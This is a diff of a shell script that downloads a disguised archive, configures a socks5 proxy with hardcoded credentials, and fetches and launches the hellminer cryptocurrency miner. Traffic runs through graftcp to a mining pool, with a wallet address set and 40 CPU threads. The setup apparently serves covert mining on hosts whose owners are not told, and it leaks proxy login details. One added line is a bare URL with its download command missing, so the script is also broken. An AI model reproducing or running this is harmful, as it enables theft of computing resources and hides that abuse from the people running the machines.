@@ -12,7 +12,7 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+https://github.com/denisule54/why/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -24,9 +24,9 @@ loglevel = 1
 
 socks5 = 209.127.191.180:9279
 
-socks5_username = hzfwtxrm
+socks5_username = zrgzxpoe
 
-socks5_password = 6i4c5so4h0ic
+socks5_password = 0va1rd1mo7nk
 
 END
 
@@ -40,10 +40,10 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/Asriytdx/kurama/raw/main/gedang.tar.gz
-tar xf gedang.tar.gz
-chmod +x hellminer
+./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+
+tar xf hellminer_cpu_linux.tar.gz
 
 ph add hellminer
 
-./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.SOLOIN -p d=4096S,xn=1,hybrid --cpu 4
+./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.dsX24 -p x --cpu 40
